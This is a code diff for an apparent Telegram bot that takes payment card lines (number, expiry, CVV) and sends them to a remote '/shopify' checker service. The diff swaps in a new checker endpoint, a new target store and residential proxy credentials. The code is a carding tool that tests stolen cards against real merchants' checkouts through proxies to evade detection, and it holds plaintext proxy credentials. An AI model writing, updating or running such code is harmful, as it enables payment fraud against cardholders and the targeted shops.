@@ -286,9 +286,12 @@ def process_card_string(card_line):
         cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
         formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
         
-        api_url = f"http://216.250.119.63/?{quote(formatted_cc)}&url=https://customsbyarrillc.myshopify.com&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
+        # New API format with site and proxy configured
+        site_url = "https://ripnroll.com"
+        proxy_val = "brd-customer-hl_54dda161-zone-isp_proxy1:sxf92a7e5g32@brd.superproxy.io:33335"
         
-        # Timeout increased to 60 seconds
+        api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(proxy_val)}"
+        
         response = requests.get(api_url, timeout=60)
         res_data = response.json()
         
@@ -408,9 +411,9 @@ def main():
     
     app.add_handler(MessageHandler(filters.Document.ALL, chf_document))
 
-    print("Bot is up and running with 60s timeout...")
+    print("Bot is up and running with new API and 60s timeout...")
     app.run_polling()
 
 if __name__ == "__main__":
     main()
-    
+        
